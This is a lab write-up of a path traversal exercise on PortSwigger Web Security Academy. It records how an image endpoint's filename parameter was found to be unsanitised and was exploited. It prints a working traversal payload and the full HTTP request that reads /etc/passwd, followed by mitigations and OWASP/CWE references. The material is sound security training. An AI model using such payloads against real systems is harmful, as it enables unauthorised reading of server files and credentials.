# Path Traversal - Simple
**Platform:** PortSwigger Web Security Academy
**Date:** 2026-07-12
**Category:** Path Traversal
**Difficulty:** Apprentice

## Vulnerability
Static image pathing allowing path traversal via unsanitized `filename` parameter. No validation on directory-traversal sequences, no path canonicalization, no restriction of resolved path to an expected base directory.

## Discovery
- Tasked with retrieving `/etc/passwd`, given an image-loading endpoint at `/image?filename=`
- Image paths follow `/image?filename=<name>.jpg` format, indicating direct filesystem read based on user input
- Requesting a non-existent filename returns "No file found" — confirms the parameter maps to a real filesystem lookup rather than a lookup table/ID
- Naive traversal attempted directly via browser `<img>` tag rendering was a diagnostic dead end — browser attempts to interpret any response as image data regardless of actual content, masking whether traversal succeeded
- Moved to Burp Suite: intercepted the request, sent to Repeater to inspect raw response body independent of browser rendering
- "../../../../etc/passwd" — traversal sequence and depth used to reach filesystem root from the image base directory

## Exploitation
Intercepted the image request in Burp and rewrote the `filename` parameter to a relative traversal sequence targeting `/etc/passwd`, with accepted type `*`,  sent via Repeater to inspect the raw response body directly rather than relying on browser image rendering.

```http
GET /image?filename=../../../../../etc/passwd HTTP/2
Host: 0ae0005a03a78fb1816eb1a3003f001c.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: *
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae0005a03a78fb1816eb1a3003f001c.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
``` 

## Impact
Arbitrary file read on the underlying filesystem. Demonstrated against `/etc/passwd`, but same primitive extends to any file readable by the web server process — application source, config files, credentials, SSH keys depending on server configuration and process permissions.

## Mitigations
**Primary:**
- Canonicalize the resolved path (`realpath()` or equivalent) and verify it falls within the intended base directory before file access
- Use an allowlist of valid filenames or an indirect reference (e.g. database ID → filename mapping) rather than accepting a raw path component from the client

**Defense in depth:**
- Run the web server process with least-privilege filesystem permissions — no read access to sensitive files outside the web root
- Containerization/chroot to physically limit what the process can reach, independent of application-layer validation
- WAF rule to flag/block traversal sequences (`../`, encoded variants) as a detection layer, not a primary control

## OWASP Reference
[A01:2025 – Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/) — path traversal is explicitly listed as one of the access-control failure patterns under this category.

## CWE Reference
[CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
